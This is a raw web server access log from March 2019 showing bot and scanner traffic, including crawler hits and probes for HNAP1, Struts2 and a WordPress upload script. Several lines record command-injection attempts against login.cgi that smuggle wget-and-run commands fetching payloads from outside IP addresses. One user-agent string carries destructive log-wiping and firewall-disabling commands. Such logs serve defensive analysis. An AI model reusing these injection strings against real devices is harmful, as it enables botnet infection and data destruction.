89.136.31.222 - - [24/Mar/2019:22:52:46 +0000] "GET /js/+ke)},t.setElementContent=function(t,e){var n=this.config.html;" 400 0 "-" "-"
89.136.31.222 - - [24/Mar/2019:22:52:46 +0000] "GET /js/'+e+' HTTP/1.1" 404 10539 "-" "Java/1.6.0_04"
89.136.31.222 - - [24/Mar/2019:22:52:46 +0000] "GET /js/controllers/user/user-auth-controller.js HTTP/1.1" 200 12375 "-" "Java/1.6.0_04"
89.136.31.222 - - [24/Mar/2019:22:52:47 +0000] "GET /js/controllers/user/).html( HTTP/1.1" 404 10539 "-" "Java/1.6.0_04"
89.136.31.222 - - [24/Mar/2019:22:52:47 +0000] "GET /js/controllers/user/).html(response.message).addClass( HTTP/1.1" 404 10539 "-" "Java/1.6.0_04"
178.128.254.59 - - [24/Mar/2019:22:57:48 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://138.197.162.98/sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1.1" 400 0 "-" "Hakai/2.0"
142.93.202.153 - - [24/Mar/2019:23:27:56 +0000] "GET / HTTP/1.1" 200 2170 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
142.93.202.153 - - [24/Mar/2019:23:27:56 +0000] "GET /HNAP1/ HTTP/1.1" 404 10533 "http://212.71.253.86/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
111.230.144.90 - - [24/Mar/2019:23:34:19 +0000] "GET /struts2-rest-showcase/orders.xhtml HTTP/1.1" 404 10533 "http://212.71.253.86:80/struts2-rest-showcase/orders.xhtml" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
111.230.144.90 - - [24/Mar/2019:23:34:19 +0000] "GET /index.action HTTP/1.1" 404 10533 "http://212.71.253.86:80/index.action" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
111.230.144.90 - - [24/Mar/2019:23:34:20 +0000] "GET /index.do HTTP/1.1" 404 10533 "http://212.71.253.86:80/index.do" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
89.175.229.8 - - [25/Mar/2019:00:13:51 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://50.115.166.136/bin%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 400 0 "-" "Hakai/2.0"
94.130.52.155 - - [25/Mar/2019:00:14:50 +0000] "GET /robots.txt HTTP/1.1" 200 271 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
94.130.52.155 - - [25/Mar/2019:00:14:50 +0000] "GET / HTTP/1.1" 200 2170 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
94.130.52.155 - - [25/Mar/2019:00:14:54 +0000] "GET /sitemap.xml HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
94.130.52.155 - - [25/Mar/2019:00:14:58 +0000] "GET /sitemap.xml HTTP/1.1" 404 10541 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
94.130.52.155 - - [25/Mar/2019:00:15:01 +0000] "GET / HTTP/1.1" 200 2177 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
202.46.49.95 - - [25/Mar/2019:00:47:32 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
134.209.69.7 - - [25/Mar/2019:00:54:03 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://138.197.162.98/sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1.1" 400 0 "-" "Hakai/2.0"
170.233.47.18 - - [25/Mar/2019:01:00:10 +0000] "GET / HTTP/1.1" 200 6070 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
77.157.49.196 - - [25/Mar/2019:01:39:26 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.244.25.108/bins/Solstice.mips%20-O%20->%20/tmp/.Solstice;chmod%20777%20/tmp/.Solstice;/tmp/.Solstice%20dlink.mips%27$ HTTP/1.1" 400 0 "-" "Solstice/2.0"
106.12.215.87 - - [25/Mar/2019:01:54:42 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://80.211.203.234/bin%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 400 0 "-" "Hakai/2.0;rm -rf /tmp/* /var/* /var/run/* /var/tmp/*;rm -rf /var/log/wtmp;rm -rf ~/.bash_history;history -c;history -w;rm -rf /tmp/*;history -c;rm -rf /bin/netstat;history -w;pkill -9 busybox;pkill -9 perl;service iptables stop;/sbin/iptables -F;/sbin/iptables -X;service firewalld stop;"
23.228.81.10 - - [25/Mar/2019:02:22:11 +0000] "GET /wp-content/themes/RightNow/includes/uploadify/upload_settings_image.php HTTP/1.1" 404 10547 "http://www.veronarisuona.it/wp-content/themes/RightNow/includes/uploadify/upload_settings_image.php" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
178.128.254.59 - - [25/Mar/2019:02:28:14 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://138.197.162.98/sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1.1" 400 0 "-" "Hakai/2.0"
185.243.51.21 - - [25/Mar/2019:02:49:14 +0000] "GET / HTTP/1.1" 200 6070 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
